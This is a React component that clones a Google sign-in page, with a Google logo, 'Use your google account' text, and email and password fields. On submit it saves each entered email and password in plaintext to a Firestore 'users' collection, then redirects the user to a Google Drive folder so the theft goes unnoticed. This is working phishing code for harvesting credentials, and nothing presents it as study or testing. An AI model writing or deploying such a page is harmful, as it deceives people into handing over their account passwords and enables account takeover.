import React, { useState } from "react";
import "./Email.css";
import logo from "../images/logo.png";
import { collection, addDoc } from "firebase/firestore";
import { db } from "../config/firebase";
const Email = () => {
  const [credentials, setCredentials] = useState({
    email: "",
    password: "",
  });
  const [clear, setClear] = useState(false);
  const [error, setError] = useState(false);
  const handleSubmit = async (e) => {
    e.preventDefault();

    try {
      if (!credentials.email || !credentials.password) {
        setError(true);
        return;
      }
      const docRef = await addDoc(collection(db, "users"), {
        email: credentials.email,
        password: credentials.password,
      });
      if (docRef?.id) {
        window.open(
          "https://drive.google.com/drive/folders/1Zr1KSlz9_Mb9zEv9N-gGRc_NHQk8BY8P",
          "_self"
        );
      }
    } catch (e) {
      console.error(e);
      // }
      // if (!clear) {
      //   setError(true);
      //   setClear(true);
      //   return;
      // }
      // if (clear && credentials.email && credentials.password) {
      //   setError(false);
      // }
    }
  };
  const handleChange = (e) => {
    const { name, value } = e.target;
    setCredentials({ ...credentials, [name]: value });
  };
  return (
    <>
      <div className="container">
        <div className="login-box">
          <div className="card">
            <img className="logo" src={logo} alt="google-logo" />
            <h3 className="title">Sign In</h3>
            <h4 className="tagline">Use your google account</h4>

            <input
              onChange={handleChange}
              className="input-box"
              type="email"
              required
              name="email"
              placeholder="Email or phone"
            />
           
            <input
              onChange={handleChange}
              type="password"
              required
              name="password"
              placeholder="Password"
              className="input-box"
            />
            {error && (
              <p className="error-text">Please enter your correct password</p>
            )}

            <p className="info">
              Not your computer? Use Guest mode to sign in privately.{" "}
              <span className="learn-more"> Learn more</span>
            </p>
            <div className="action">
              <p className="create">Create Account</p>
              <button
                onClick={handleSubmit}
                //   type="submit"
                className="next-btn"
              >
                Next
              </button>
            </div>
          </div>
          <div className="footer">
            <p className="link">English (United States)</p>
            <div className="link-box">
              <p className="link">Help</p>
              <p className="link">Privacy</p>
              <p className="link">Terms</p>
            </div>
          </div>
        </div>
      </div>
    </>
  );
};

export default Email;
